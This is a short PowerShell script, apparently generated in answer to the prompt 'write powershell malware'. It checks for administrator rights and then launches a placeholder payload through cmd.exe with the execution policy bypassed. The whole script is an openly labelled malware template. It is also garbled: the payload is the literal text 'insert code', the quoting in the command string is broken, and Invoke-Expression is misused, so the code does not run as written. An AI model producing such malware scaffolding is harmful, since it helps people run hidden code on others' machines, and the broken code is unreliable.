# write powershell malware

$malware = {
    #Check for system administrator privileges
    $user = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal $user
    $maliciousCode = insert code
    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        #Create a malicious cmd
        $cmd = "powershell.exe -ExecutionPolicy Bypass -Command "& {$maliciousCode}""
 
        #Create a new process
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start()
    }
}

#Run the malicious code
Invoke-Expression -Command $malware
